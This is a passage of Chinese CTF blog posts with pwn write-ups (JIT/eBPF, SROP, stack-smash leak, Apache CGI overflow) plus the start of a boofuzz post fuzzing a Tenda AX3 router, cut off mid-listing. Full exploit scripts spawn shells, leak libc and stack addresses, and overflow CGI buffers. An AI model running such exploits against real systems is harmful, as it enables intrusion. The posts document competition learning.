src="/img/C++/19.png" alt="img"></p><p>这边大致是创建虚拟机并进行一系列初始化的过程，具体操作👴也没逆明白</p><p><img src="/img/C++/20.png" alt="img"></p><p>然后就是核心<code>code</code></p><p><img src="/img/C++/21.png" alt="img"></p><p><code>func_8510</code>里，通过<code>func_84e0--&gt;func_8370--&gt;func_5a50</code>这个2000行的屎山把输入的<code>program</code>翻译成汇编存储在申请出来的<code>chunk</code>里</p><p><code>mmap</code>一片内存，把<code>chunk</code>里的汇编<code>copy</code>过去，然后<code>mprotect</code>改成<code>r_x</code>权限</p><p><code>call rax</code>就是执行翻译的汇编</p><p><img src="/img/C++/22.png" alt="img"></p><p>最后有个<code>result</code>输出的是执行完后的寄存器<code>rax</code>值</p><p>差不多了，快吐了</p><p>😭😭😭</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>问题来了，那个2000行的代码等👴看完估计是天都亮了，👴果断去看wp，发现很多👴都说这是<code>ebpf</code></p><p>👴：？？？</p><p>👴：妈妈生的，这是个什么玩意</p><p>然后👴就去找这玩意的<a href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md">指令集</a></p><p>一试，对上了，那就好办了</p><p>先连上找个libc值给rax，打印出来康康libc版本</p><p>然后就是ogg覆盖返回地址，因为👴莫得找到syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;jit&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># rax:0</span><br><span class="hljs-comment"># rdi:1</span><br><span class="hljs-comment"># rsi:2</span><br><span class="hljs-comment"># rdx:3</span><br><span class="hljs-comment"># r9:4</span><br><span class="hljs-comment"># r8:5</span><br><span class="hljs-comment"># rbx:6</span><br><span class="hljs-comment"># r13:7</span><br><span class="hljs-comment"># r14:8</span><br><span class="hljs-comment"># r15:9</span><br><span class="hljs-comment"># rbp:a</span><br><br>program = <span class="hljs-string">b&#x27;61a0380100000000&#x27;</span>   <span class="hljs-comment">#mov eax,[rbp-0x138]</span><br>program += <span class="hljs-string">b&#x27;1400000083400200&#x27;</span>  <span class="hljs-comment">#sub eax,libc.sym[&#x27;__libc_start_main&#x27;]+243</span><br>program += <span class="hljs-string">b&#x27;04000000043b0e00&#x27;</span>  <span class="hljs-comment">#add eax,ogg</span><br>program += <span class="hljs-string">b&#x27;7b8a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],r14</span><br>program += <span class="hljs-string">b&#x27;630a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],eax</span><br>program += <span class="hljs-string">b&#x27;af22000000000000&#x27;</span>  <span class="hljs-comment">#xor rsi, rsi</span><br>program += <span class="hljs-string">b&#x27;af33000000000000&#x27;</span>  <span class="hljs-comment">#xor rdx, rdx</span><br>memory = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(program)//<span class="hljs-number">2</span>).encode()<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x2947)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,program)<br>leak(<span class="hljs-string">&quot;libc_start_main&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">243</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,memory)<br><br><br><span class="hljs-comment"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [r12] == NULL || r12 == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [rsi] == NULL || rsi == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>不知道是不是👴的错觉，<code>JIT</code>总给👴一种用<code>shellcode</code>完成利用方式的<code>vm</code>题</p><p>真的逆吐惹🤮🤮🤮</p><p>而且👴有一个问题，怎么那么多👴看到题一眼就知道是<code>ebpf</code>？？？</p><p>后续：</p><p><img src="/img/C++/23.png" alt="img"></p><p>👴&lt;——🤡🤡🤡🤡🤡</p><h1 id="0xff-写在最后的最后"><a href="#0xff-写在最后的最后" class="headerlink" title="0xff:写在最后的最后"></a>0xff:写在最后的最后</h1><p>逆不动了，真tm逆不动了，汗流浃背了已经🥵🥵🥵</p><h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://zqy.ink/2023/05/12/dingjiqiandao/">N1CTF Junior 2023 pwn 顶级签到 赛题复现 | 张清越 (zqy.ink)</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md">6.1 Pwn - 6.1.8 pwn DCTF2017 Flex - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack</a></p><p><a href="https://www.anquanke.com/post/id/89855#h3-8">Shanghai-DCTF-2017 线下攻防Pwn题-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://arttnba3.cn/2021/01/20/CTF-0X02-STARCTF2021-PWN/#0x02-babygame-double-free-tcache-poisoning">【CTF.0X02】*CTF2021-Pwn WP - arttnba3’s blog</a></p><p><a href="https://www.cnblogs.com/winmt/articles/17018284.html">NepnepxCATCTF Pwn-Chao WriteUp - winmt - 博客园 (cnblogs.com)</a></p><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/">2023西湖论剑初赛pwn-jit - roderick - record and learn! (roderickchan.cn)</a></p><p><a href="https://lst-oss.github.io/2023/08/23/jit-pwn/#2023-wmctf-jit">jit-pwn - Hexo (lst-oss.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华为杯</title>
    <link href="/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <url>/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>别问，问就是👴忘记找研院的联系老师审核了，报名没报上，捏麻麻滴。一想到进决赛就能回浙江耍，我身上仿佛有蚂蚁在爬</p><p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p><h1 id="0x1-pwn题解"><a href="#0x1-pwn题解" class="headerlink" title="0x1:pwn题解"></a>0x1:pwn题解</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>什么👴敢叫自己master of asm啊，知不知道自己有几斤小马珍珠啊</p><p>就简单的srop</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>import sys<br><span class="hljs-built_in">context</span>.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-built_in">context</span>.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>flag = <span class="hljs-number">0</span><br>if flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-symbol">else:</span><br>    p = process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>sa = lambda s,n : p.sendafter(s,n)<br>sla = lambda s,n : p.sendlineafter(s,n)<br>sl = lambda s : p.sendline(s)<br>sd = lambda s : p.send(s)<br>rc = lambda n : p.recv(n)<br>ru = lambda s : p.recvuntil(s)<br>ti = lambda : p.interactive()<br>leak = lambda name,<span class="hljs-keyword">addr </span>:log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(<span class="hljs-keyword">addr))</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">xor_0 </span>= <span class="hljs-number">0x40103d</span><br>rax_2 = <span class="hljs-number">0x401030</span><br><span class="hljs-keyword">xor_1 </span>= <span class="hljs-number">0x401034</span><br><span class="hljs-keyword">syscall </span>= <span class="hljs-number">0x40102d</span><br><span class="hljs-keyword">bin_sh </span>= <span class="hljs-number">0x40200a</span><br><br>exec_fun = SigreturnFrame()<br>exec_fun.rax = <span class="hljs-number">0x3b</span><br>exec_fun.rdi = <span class="hljs-keyword">bin_sh</span><br><span class="hljs-keyword"></span>exec_fun.rsi = <span class="hljs-number">0</span><br>exec_fun.rdx = <span class="hljs-number">0</span><br>exec_fun.rip = <span class="hljs-keyword">syscall</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shellcode </span>= p64(<span class="hljs-keyword">xor_0)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">syscall)\</span><br><span class="hljs-keyword"></span>            + <span class="hljs-keyword">bytes(exec_fun)</span><br><span class="hljs-keyword"></span><br>p.send(<span class="hljs-keyword">shellcode.ljust(0x190,b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword"></span>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-ssp"><a href="#ez-ssp" class="headerlink" title="ez_ssp"></a>ez_ssp</h2><p>👴当初铸币了，👴知道是stack smash，但👴不知道为什么一直在想一次溢出就把flag泄露出来，爆破栈地址爆了好久都没成功。</p><p>然后结果只要轻轻泄露got表地址，再用libc把_environ里的栈地址拿出来就好了，草</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>import sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    <span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">p</span> = process(<span class="hljs-string">&quot;./ssp&quot;</span>)<br><span class="hljs-keyword">sa</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendafter(s,n)<br><span class="hljs-keyword">sla</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendlineafter(s,n)<br><span class="hljs-keyword">sl</span> = lambda s : <span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s : <span class="hljs-keyword">p</span>.send(s)<br>rc = lambda n : <span class="hljs-keyword">p</span>.recv(n)<br><span class="hljs-keyword">ru</span> = lambda s : <span class="hljs-keyword">p</span>.recvuntil(s)<br>ti = lambda : <span class="hljs-keyword">p</span>.interactive()<br>leak = lambda name,addr :<span class="hljs-built_in">log</span>.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(addr))<br># gdb.attach(<span class="hljs-keyword">p</span>,<span class="hljs-string">&#x27;b __stack_chk_fail\nc\n&#x27;</span>)<br><br>randon = []<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(<span class="hljs-number">0</span>x602018))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>libc.address = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>stack = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br><br>flag_addr = stack - <span class="hljs-number">0</span>x178<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(flag_addr))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>flag = rc(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">print</span>(randon)<br>flag_list = <span class="hljs-keyword">list</span>(flag)  # 将字符串转换为列表，以便进行修改<br><span class="hljs-keyword">print</span>(flag_list)<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(randon)):<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>        flag_list[<span class="hljs-keyword">j</span>] = flag_list[<span class="hljs-keyword">j</span>] ^ randon[<span class="hljs-number">2</span>-i]<br><br>flag_txt = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>    flag_txt = flag_txt + chr(flag_list[i])<br><span class="hljs-keyword">print</span>(flag_txt)<br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="APACHE-CGI-PWN"><a href="#APACHE-CGI-PWN" class="headerlink" title="APACHE-CGI-PWN"></a>APACHE-CGI-PWN</h2><p>👴一直以为这是个很吊的web pwn，然后浩哥哥直接秒了，👴才发现是个小瘪三</p><p>话说最近怎么这么喜欢出套着web皮的 cgi pwn题吗，陇剑也是</p><p>这边直接偷浩哥哥的exp了，嘻嘻</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>import requests<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&quot;ROOT-GOD=Every king&#x27;s blood will end with a sword&quot;</span>,<br>    <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>:<span class="hljs-string">&#x27;99999&#x27;</span><br>&#125;<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe8)+p64(0x4032fc)+p64(0x4032E0)<br>cookie = requests.post(<span class="hljs-string">&#x27;http://ip:port/getcookie.cgi&#x27;</span>,<span class="hljs-attribute">data</span>=<span class="hljs-string">&quot;eeknight&quot;</span>,headers=headers)<br>check = requests.post(<span class="hljs-string">&#x27;http://ip:port/check-ok.cgi&#x27;</span>, data = payload,<span class="hljs-attribute">headers</span>=headers)<br><br>p = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;http://ip:port/flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(cookie.text)<br><span class="hljs-built_in">print</span>(check.text)<br><span class="hljs-built_in">print</span>(p.text)<br></code></pre></td></tr></table></figure><h1 id="0x3-最后的最后"><a href="#0x3-最后的最后" class="headerlink" title="0x3:最后的最后"></a>0x3:最后的最后</h1><p>有什么好说的呢，就这样吧</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>令人疑惑的boofuzz</title>
    <link href="/2023/08/26/boofuzz/"/>
    <url>/2023/08/26/boofuzz/</url>
    
    <content type="html"><![CDATA[<h1 id="令人疑惑的boofuzz"><a href="#令人疑惑的boofuzz" class="headerlink" title="令人疑惑的boofuzz"></a>令人疑惑的boofuzz</h1><p>本文最后更新于：2023年8月22日 晚上</p><h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>boofuzz这一基于生成的fuzz框架，笔者一直有所耳闻</p><p>且在笔者学习Iot后，对于能fuzz网络协议的boofuzz，更是产生的极大的兴趣。所以，笔者抱着学习boofuzz后能在Iot漏洞挖掘中提高效率的目的于最近浅浅的接触了一下boofuzz。</p><p>然后，没有然后了</p><p>给笔者整破防了，直接原地道心破碎</p><p>PS：笔者这篇文章主要是记一点无用的板子和吐槽，各位大师傅如果想看源码解析或者逻辑思路的可以点×了。</p><h1 id="0x1-还算正经的板子"><a href="#0x1-还算正经的板子" class="headerlink" title="0x1: 还算正经的板子"></a>0x1: 还算正经的板子</h1><p>笔者这边fuzz的target是Tenda AX3</p><p>首先要抓包抓一点原始数据</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">115</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5790</span>.<span class="hljs-number">171</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Sec</span>-Purpose: prefetch;prerender</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Purpose</span>: prefetch</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br></code></pre></td></tr></table></figure><p>其实根据这个就可以写原语了，但这个Request是login请求，没什么多大意义</p><p>于是笔者找了个存在漏洞的函数接口，先fuzz试试效果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 